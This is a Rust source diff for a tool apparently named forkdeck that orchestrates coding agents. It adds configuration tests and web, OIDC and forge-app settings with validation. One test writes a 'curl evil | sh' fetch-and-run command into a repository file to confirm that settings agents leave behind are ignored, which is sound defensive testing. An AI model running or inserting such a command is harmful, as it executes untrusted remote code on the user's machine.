+            assert!(bad.validate().unwrap_err().to_string().contains(&format!("web.forges.github.{key}")), "{key}: {value}");
+        }
+        let mut demo = cfg;
+        demo.demo = true;
+        assert!(demo.validate().unwrap_err().to_string().contains("--demo"));
+        toml::from_str::<Config>(EXAMPLE).unwrap().validate().unwrap();
+    }
+
+    #[test]
     fn gh_is_told_the_host_only_for_github_enterprise() {
         let on = |provider: &str, host: &str| { let mut r: RepoCfg = toml::from_str(&format!("provider = \"{provider}\"\nrepo = \"o/r\"\npath = \"/tmp\"")).unwrap(); r.host = host.into(); r.host_args() };
         assert_eq!(on("github", "github.example.com"), ["--hostname", "github.example.com"]);
@@ -1068,11 +1462,153 @@ mod tests {
     }
 
     #[test]
+    fn plan_and_human_labels_default_and_stay_distinct() {
+        let cfg: Config = toml::from_str("[[repos]]\nprovider='github'\nrepo='a/b'\npath='/tmp'\n").unwrap();
+        assert_eq!((cfg.repos[0].plan_label.as_str(), cfg.repos[0].human_label.as_str()), ("forkdeck:plan", "needs-human"));
+        for bad in ["plan_label = 'agent:ready'", "human_label = 'agent:working'", "plan_label = ''"] {
+            let c: Config = toml::from_str(&format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '/tmp/repo'\n{}", bad)).unwrap();
+            assert!(c.validate().is_err(), "{}", bad);
+        }
+    }
+
+    fn entry(text: &str) -> toml::Table {
+        toml::from_str(&format!("provider = 'github'\nrepo = 'o/r'\npath = '/tmp/repo'\n{}", text)).unwrap()
+    }
+
+    #[test]
+    fn repo_file_fills_what_the_user_config_leaves_unset() {
+        let mut e = entry("checks = ['mine']");
+        merge_repo_file(&mut e, "checks = ['theirs']\nlabel = 'bot:go'\nallowed_authors = ['a']").unwrap();
+        let r: RepoCfg = toml::Value::Table(e).try_into().unwrap();
+        assert_eq!(r.checks, ["mine"], "the user's own config wins");
+        assert_eq!(r.label, "bot:go");
+        assert_eq!(r.allowed_authors, ["a"]);
+    }
+
+    #[test]
+    fn repo_file_cannot_say_which_repository_or_clone_it_is() {
+        for bad in ["provider = 'gitlab'", "repo = 'x/y'", "path = '/etc'", "base = 'dev'"] {
+            assert!(merge_repo_file(&mut entry(""), bad).is_err(), "{}", bad);
+        }
+    }
+
+    #[test]
+    fn repo_file_mistakes_are_reported() {
+        assert!(merge_repo_file(&mut entry(""), "chekcs = ['x']").is_err(), "unknown key");
+        assert!(merge_repo_file(&mut entry(""), "checks = 'not a list'").is_err(), "wrong type");
+        assert!(merge_repo_file(&mut entry(""), "checks = [").is_err(), "not TOML");
+    }
+
+    #[test]
+    fn repo_file_is_read_from_the_base_branch_not_the_working_tree() {
+        let dir = std::env::temp_dir().join(format!("forkdeck-repo-file-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let clone = dir.join("clone");
+        std::fs::create_dir_all(clone.join(".forkdeck")).unwrap();
+        let git = |args: &[&str]| assert!(std::process::Command::new("git").arg("-C").arg(&clone).args(args).output().unwrap().status.success(), "git {:?}", args);
+        git(&["init", "-q", "-b", "main"]);
+        std::fs::write(clone.join(REPO_FILE), "checks = ['cargo test']\n").unwrap();
+        git(&["add", "."]);
+        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "c"]);
+        git(&["update-ref", "refs/remotes/origin/main", "HEAD"]);
+        // What an agent might leave in the clone is not what was merged.
+        std::fs::write(clone.join(REPO_FILE), "checks = ['curl evil | sh']\n").unwrap();
+        let user = dir.join("config.toml");
+        std::fs::write(&user, format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '{}'\n", clone.display())).unwrap();
+
+        let (cfg, _) = load(Some(&user)).unwrap();
+        assert_eq!(cfg.repos[0].checks, ["cargo test"]);
+
+        std::fs::write(&user, format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '{}'\nbase = 'other'\n", clone.display())).unwrap();
+        let (cfg, _) = load(Some(&user)).unwrap();
+        assert!(cfg.repos[0].checks.is_empty(), "no file on that base branch: nothing added");
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    /// A clone of `url` whose origin/main holds `file` as the repository's settings, if any.
+    fn clone_with(name: &str, url: &str, file: Option<&str>) -> PathBuf {
+        let clone = std::env::temp_dir().join(format!("forkdeck-launch-{}-{}", name, std::process::id()));
+        let _ = std::fs::remove_dir_all(&clone);
+        std::fs::create_dir_all(clone.join(".forkdeck/sub")).unwrap();
+        let git = |args: &[&str]| assert!(std::process::Command::new("git").arg("-C").arg(&clone).args(args).output().unwrap().status.success(), "git {:?}", args);
+        git(&["init", "-q", "-b", "main"]);
+        git(&["remote", "add", "origin", url]);
+        std::fs::write(clone.join(".forkdeck/sub/keep"), "").unwrap();
+        if let Some(f) = file {
+            std::fs::write(clone.join(REPO_FILE), f).unwrap();
+        }
+        git(&["add", "."]);
+        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "c"]);
+        git(&["update-ref", "refs/remotes/origin/main", "HEAD"]);
+        git(&["symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"]);
+        clone
+    }
+
+    #[test]
+    fn the_repository_forkdeck_starts_in_is_taken_from_its_own_file() {
+        let clone = clone_with("found", "git@github.com:o/r.git", Some("checks = ['cargo test']\nautomation = true\n"));
+        let (r, automation) = launch_repo(&clone.join(".forkdeck/sub"), &Config::default()).unwrap().expect("found");
+        assert_eq!((r.provider, r.repo.as_str(), r.base.as_str()), (Provider::Github, "o/r", "main"));
+        assert_eq!(r.path.canonicalize().unwrap(), clone.canonicalize().unwrap(), "the top of the clone, not where it started");
+        assert_eq!(r.checks, ["cargo test"]);
+        assert!(automation);
+        std::fs::remove_dir_all(&clone).unwrap();
+    }
+
+    #[test]
+    fn a_repository_without_its_own_file_is_left_alone() {
+        let clone = clone_with("nofile", "https://gitlab.example.com/g/sub/p.git", None);
+        assert!(launch_repo(&clone, &Config::default()).unwrap().is_none());
+        std::fs::remove_dir_all(&clone).unwrap();
+    }
+
+    #[test]
+    fn the_launch_repository_is_not_added_twice_or_guessed() {
+        let clone = clone_with("listed", "git@github.com:o/r.git", Some("checks = ['x']\n"));
+        let cfg: Config = toml::from_str(&format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '{}'\n", clone.display())).unwrap();
+        assert!(launch_repo(&clone, &cfg).unwrap().is_none(), "already listed");
+        std::fs::remove_dir_all(&clone).unwrap();
+
+        let clone = clone_with("unknown", "https://git.example.com/o/r.git", Some("checks = ['x']\n"));
+        assert!(launch_repo(&clone, &Config::default()).unwrap().is_none(), "neither GitHub nor GitLab");
+        std::fs::remove_dir_all(&clone).unwrap();
+
+        let clone = clone_with("gitlab", "https://gitlab.example.com/g/sub/p.git", Some("checks = ['x']\n"));
+        let (r, automation) = launch_repo(&clone, &Config::default()).unwrap().unwrap();
+        assert_eq!((r.provider, r.repo.as_str()), (Provider::Gitlab, "g/sub/p"));
+        assert!(!automation, "polling stays off unless the file asks");
+        std::fs::remove_dir_all(&clone).unwrap();
+    }
+
+    #[test]
+    fn mirrors_and_agent_domains_are_host_names() {
+        let cfg: Config = toml::from_str("[agents.network]\npublic_registries = false\nmirrors = [\"nexus.example.com\"]").unwrap();
+        cfg.validate().unwrap();
+        assert!(!cfg.agents.network.public_registries);
+        assert_eq!(cfg.agents.network.mirrors, ["nexus.example.com"]);
+        assert!(Config::default().agents.network.public_registries, "public registries by default");
+        for bad in ["https://nexus.example.com", "nexus.example.com/repository/npm", ""] {
+            let cfg: Config = toml::from_str(&format!("[agents.network]\nmirrors = [{bad:?}]")).unwrap();
+            assert!(cfg.validate().unwrap_err().to_string().contains("host names"), "{bad}");
+        }
+    }
+
+    #[test]
+    fn rejects_invalid_invocation_budgets_at_load_validation() {
+        for value in ["0", "-1", "nan", "inf"] {
+            let cfg: Config = toml::from_str(&format!("[adaptive]\ninvocation_max_usd={value}")).unwrap();
+            assert!(cfg.validate().unwrap_err().to_string().contains("invocation_max_usd"));
+        }
+        let cfg: Config = toml::from_str("[adaptive]\ninvocation_max_usd=0.25\n[agents.claude]\nwrite_args=['--max-budget-usd=1']").unwrap();
+        assert!(cfg.validate().unwrap_err().to_string().contains("explicit --max-budget-usd"));
+    }
+
+    #[test]
     fn example_config_parses() {
         let cfg: Config = toml::from_str(EXAMPLE).expect("example parses");
         cfg.validate().unwrap();
         // What `init` writes has to behave like having no config at all.
-        assert_eq!(cfg.router.kind, "rules");
+        assert_eq!(cfg.router.kind, "auto");
         assert!(cfg.repos.is_empty());
         assert!(!cfg.automation.enabled);
         assert_eq!(cfg.agents.get(AgentKind::Claude).models.unwrap().get(Tier::Heavy), "opus");
@@ -1172,7 +1708,7 @@ tool = "rollback"
     fn empty_config_is_valid() {
         let cfg: Config = toml::from_str("").unwrap();
         cfg.validate().unwrap();
-        assert_eq!(cfg.router.kind, "rules");
+        assert_eq!(cfg.router.kind, "auto");
         assert!(!cfg.automation.enabled);
     }
 
@@ -1225,5 +1761,175 @@ tool = "rollback"
         assert!(check("[router]\ndefault_agent = \"copilot\"").is_err(), "the router stays two-way");
         assert!(check("[agents.copilot]\ntypo = 1").is_err());
         assert!(check("[agents.copilot]\nmodels = { standard = \"auto\" }").is_ok(), "auto is fine for copilot itself");
+    }
+}
+
+/// Browser UI, with optional group-based OpenID Connect access.
+#[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(default, deny_unknown_fields)]
+pub struct WebCfg {
+    /// Address to listen on: 127.0.0.1 (this machine only), or e.g. 0.0.0.0 on a server.
+    pub bind: String,
+    pub port: u16,
+    pub oidc: Option<OidcCfg>,
+    pub lanes: LaneNames,
+    pub forges: ForgeApps,
+}
+
+impl Default for WebCfg {
+    fn default() -> Self { Self { bind: "127.0.0.1".into(), port: 7420, oidc: None, lanes: LaneNames::default(), forges: ForgeApps::default() } }
+}
+
+/// What the board's six lanes are called. Which jobs go in which lane does not change.
+#[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(default, deny_unknown_fields)]
+pub struct LaneNames {
+    pub queue: String,
+    pub build: String,
+    pub review: String,
+    pub delivery: String,
+    pub done: String,
+    pub attention: String,
+}
+
+impl Default for LaneNames {
+    fn default() -> Self {
+        Self { queue: "Queue".into(), build: "Build".into(), review: "Review".into(), delivery: "Delivery".into(), done: "Done".into(), attention: "Attention".into() }
+    }
+}
+
+impl LaneNames {
+    /// In board order, the same order as the lanes jobs are placed in.
+    pub fn in_order(&self) -> [&str; 6] {
+        [&self.queue, &self.build, &self.review, &self.delivery, &self.done, &self.attention]
+    }
+}
+
+impl WebCfg {
+    pub fn check(&self) -> anyhow::Result<()> {
+        self.address()?;
+        for (key, name) in ["queue", "build", "review", "delivery", "done", "attention"].iter().zip(self.lanes.in_order()) {
+            if name.trim().is_empty() || name.chars().count() > 40 {
+                anyhow::bail!("web.lanes.{} must be 1 to 40 characters, got {:?}", key, name);
+            }
+        }
+        Ok(())
+    }
+
+    pub fn address(&self) -> anyhow::Result<std::net::SocketAddr> {
+        let ip: std::net::IpAddr = self.bind.trim().trim_start_matches('[').trim_end_matches(']').parse()
+            .map_err(|_| anyhow::anyhow!("web.bind must be an IP address such as 127.0.0.1 or 0.0.0.0, got {:?}", self.bind))?;
+        Ok(std::net::SocketAddr::new(ip, self.port))
+    }
+}
+
+
+#[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(deny_unknown_fields)]
+pub struct OidcCfg {
+    pub issuer: String,
+    pub client_id: String,
+    pub client_secret_env: String,
+    pub redirect_url: String,
+    #[serde(default = "oidc_scopes")]
+    pub scopes: Vec<String>,
+    #[serde(default = "oidc_groups")]
+    pub groups_claim: String,
+    pub roles: OidcRoles,
+    #[serde(default = "oidc_lifetime")]
+    pub session_lifetime_secs: u64,
+}
+
+fn oidc_scopes() -> Vec<String> { ["openid", "email", "profile", "groups"].map(String::from).to_vec() }
+fn oidc_groups() -> String { "groups".into() }
+fn oidc_lifetime() -> u64 { 12 * 60 * 60 }
+
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
+#[serde(default, deny_unknown_fields)]
+pub struct OidcRoles {
+    pub viewer: Vec<String>,
+    pub operator: Vec<String>,
+    pub admin: Vec<String>,
+}
+
+impl OidcCfg {
+    pub fn validate(&self) -> anyhow::Result<()> {
+        let issuer = reqwest::Url::parse(&self.issuer)?;
+        let redirect = reqwest::Url::parse(&self.redirect_url)?;
+        let clean = |u: &reqwest::Url| u.host_str().is_some() && u.username().is_empty() && u.password().is_none() && u.query().is_none() && u.fragment().is_none();
+        let local = issuer.host_str().is_some_and(|h| h == "localhost" || h.parse::<std::net::IpAddr>().is_ok_and(|ip| ip.is_loopback()));
+        anyhow::ensure!(clean(&issuer) && (issuer.scheme() == "https" || (issuer.scheme() == "http" && local)), "web.oidc.issuer must be HTTPS (HTTP allowed for a loopback provider)");
+        anyhow::ensure!(clean(&redirect) && redirect.scheme() == "https" && redirect.path() == "/auth/callback", "web.oidc.redirect_url must be the public HTTPS /auth/callback URL");
+        anyhow::ensure!(!self.client_id.trim().is_empty(), "web.oidc.client_id is required");
+        anyhow::ensure!(!self.client_secret_env.is_empty() && self.client_secret_env.bytes().enumerate().all(|(i,b)| b == b'_' || b.is_ascii_alphabetic() || (i > 0 && b.is_ascii_digit())), "web.oidc.client_secret_env must name an environment variable");
+        anyhow::ensure!(!self.groups_claim.split('.').any(str::is_empty), "web.oidc.groups_claim must be a dotted claim path");
+        anyhow::ensure!(self.scopes.iter().any(|s| s == "openid") && self.scopes.iter().all(|s| !s.is_empty() && !s.chars().any(char::is_whitespace)), "web.oidc.scopes must contain openid and valid scope names");
+        let groups: Vec<_> = self.roles.viewer.iter().chain(&self.roles.operator).chain(&self.roles.admin).collect();
+        anyhow::ensure!(!groups.is_empty() && groups.iter().all(|g| !g.trim().is_empty()), "web.oidc.roles must allow at least one nonempty group");
+        anyhow::ensure!(self.session_lifetime_secs > 0 && self.session_lifetime_secs <= 365 * 86400, "web.oidc.session_lifetime_secs must be 1..31536000");
+        Ok(())
+    }
+}
+
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
+#[serde(default, deny_unknown_fields)]
+pub struct ForgeApps {
+    #[serde(deserialize_with = "github_app")]
+    pub github: Option<ForgeAppCfg>,
+    #[serde(deserialize_with = "gitlab_app")]
+    pub gitlab: Option<ForgeAppCfg>,
+}
+
+fn forge_app<'de, D: serde::Deserializer<'de>>(d: D, host: &str) -> Result<Option<ForgeAppCfg>, D::Error> {
+    let mut app = Option::<ForgeAppCfg>::deserialize(d)?;
+    if let Some(app) = &mut app {
+        if app.host.is_empty() { app.host = host.into(); }
+        app.clone_dir = expand(&app.clone_dir);
+    }
+    Ok(app)
+}
+fn github_app<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Option<ForgeAppCfg>, D::Error> { forge_app(d, "github.com") }
+fn gitlab_app<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Option<ForgeAppCfg>, D::Error> { forge_app(d, "gitlab.com") }
+fn forge_clone_dir() -> PathBuf { expand(Path::new("~/.local/share/forkdeck/repos")) }
+
+#[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(deny_unknown_fields)]
+pub struct ForgeAppCfg {
+    #[serde(default)]
+    pub host: String,
+    pub client_id: String,
+    pub client_secret_env: String,
+    pub redirect_url: String,
+    #[serde(default)]
+    pub private: bool,
+    #[serde(default = "forge_clone_dir")]
+    pub clone_dir: PathBuf,
+    /// Loopback provider override for tests.
+    #[serde(default)]
+    pub base_url: String,
+}
+
+impl ForgeAppCfg {
+    pub fn secret(&self) -> anyhow::Result<String> {
+        std::env::var(&self.client_secret_env).ok().filter(|s| !s.trim().is_empty())
+            .ok_or_else(|| anyhow::anyhow!("client_secret_env must refer to a nonempty environment variable"))
+    }
+
+    fn validate(&self, provider: &str) -> anyhow::Result<()> {
+        let key = format!("web.forges.{provider}");
+        anyhow::ensure!(!self.client_id.trim().is_empty(), "{key}.client_id is required");
+        anyhow::ensure!(!self.client_secret_env.is_empty() && self.client_secret_env.bytes().enumerate().all(|(i,b)| b == b'_' || b.is_ascii_alphabetic() || (i > 0 && b.is_ascii_digit())), "{key}.client_secret_env must name an environment variable");
+        self.secret().map_err(|_| anyhow::anyhow!("{key}.client_secret_env must refer to a nonempty environment variable"))?;
+        let host = reqwest::Url::parse(&format!("https://{}", self.host)).ok();
+        anyhow::ensure!(host.is_some_and(|u| u.host_str().is_some() && u.username().is_empty() && u.password().is_none() && u.port().is_none() && u.path() == "/" && u.query().is_none() && u.fragment().is_none()) && !self.host.contains(['/', '?', '#', '@', ':']), "{key}.host must be a host name");
+        for (name, value) in [("redirect_url", self.redirect_url.as_str()), ("base_url", self.base_url.as_str())] {
+            if name == "base_url" && value.is_empty() { continue; }
+            let u = reqwest::Url::parse(value).map_err(|_| anyhow::anyhow!("{key}.{name} must be a valid URL"))?;
+            let local = u.host_str().is_some_and(|h| h == "localhost" || h.trim_start_matches('[').trim_end_matches(']').parse::<std::net::IpAddr>().is_ok_and(|ip| ip.is_loopback()));
+            anyhow::ensure!(u.host_str().is_some() && u.username().is_empty() && u.password().is_none() && u.query().is_none() && u.fragment().is_none() && (u.scheme() == "https" || (local && u.scheme() == "http")), "{key}.{name} must be HTTPS (HTTP allowed on loopback)");
+            anyhow::ensure!(if name == "redirect_url" { u.path() == format!("/forges/{provider}/callback") } else { u.path() == "/" }, "{key}.{name} has an invalid path");
+        }
+        anyhow::ensure!(self.clone_dir.is_absolute(), "{key}.clone_dir must be absolute");
+        Ok(())
     }
 }
